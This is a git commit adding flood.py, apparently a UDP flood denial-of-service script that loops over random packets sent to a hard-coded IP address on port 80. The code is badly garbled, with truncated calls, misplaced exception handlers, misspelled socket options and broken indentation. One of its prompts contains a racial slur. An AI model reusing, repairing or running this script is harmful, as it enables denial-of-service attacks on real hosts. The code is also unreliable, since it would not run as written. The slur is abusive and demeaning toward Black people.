116660aa0748e59cfe6f814774460116c94db814
X-Pen <53021082+X-Pen@users.noreply.github.com>
2019-12-30 11:58:34 +0100

    Add files via upload

---
+++ flood.py
@@ -0,0 +1,57 @@
+import socket
+import time
+import random
+import threading
+
+class Denial:
+     def __init__(self, host, port):
+         threading.Thread._init_(self)
+         self.connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+         self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REVSEADDR, 1)
+         self.host = host 
+         self.port = 80
+         self.duration = 0
+         self.bytes = random._urandom(1024)
+         self.send = 0
+         
+         def send_packet(self):
+             while True:
+                 try:
+                     send_all = self.connection.sendto(self.bytes,(self.host, self.
+                     print("[+] Flood Has Started On " + self.host)
+                     except UnboundLocalError:
+                         try:
+                             pass
+                             send_all = self.connection.sendto(selfbytes(self.host, self.port))
+                           except:
+                              pass
+                              except KeyBoardInterrupt:
+                               print("/n")
+                               print("[+] Exciting... ")
+                               print("/n")
+                             while True:
+                             connect_all = send_all.accept()
+                             newthread = ClientThread(send_all)
+                             newthread.start()
+                             
+                             
+                             print("Press Crontrol^c")
+                             more_dos = input("[+] Would you like Too Smack a Nigga[exit/return]: ")
+                             
+                             if more_dos == "exit":
+                                 self.connection.close()
+                                  exit()
+                                  elif more_dos == "return":
+                                     self.send_packet()
+                                     else:
+                                     self.connection..close()
+                                     exit()
+                                     
+                                     result = Denial("71.225.62.200", 80)
+                                     results.send_packet()
+                            
+                           
+                             
+                             
+                        
+                          
